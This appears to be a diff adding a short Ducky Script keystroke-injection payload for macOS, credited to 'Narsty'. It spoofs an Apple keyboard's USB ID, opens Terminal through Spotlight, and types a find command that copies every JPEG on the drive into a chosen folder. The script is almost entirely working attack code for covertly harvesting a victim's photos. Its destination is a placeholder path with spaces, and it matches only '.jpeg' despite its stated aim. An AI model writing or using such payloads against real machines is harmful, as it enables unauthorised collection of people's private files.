@@ -1,0 +1,22 @@
+REM This script opens the terminal.
+REM It searches for all JPEG image files located on the entire hard drive.
+REM It copies the found JPEG images to a folder named "Images" in the destination of your choice.
+
+REM Author: Narsty
+REM Title: Copy All JPEG Images 
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: 
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 300
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 1000
+STRING find / -type f -iname "*.jpeg" -exec cp {} ~/Insert Destination here /Images/ \;
+DELAY 2000
+ENTER
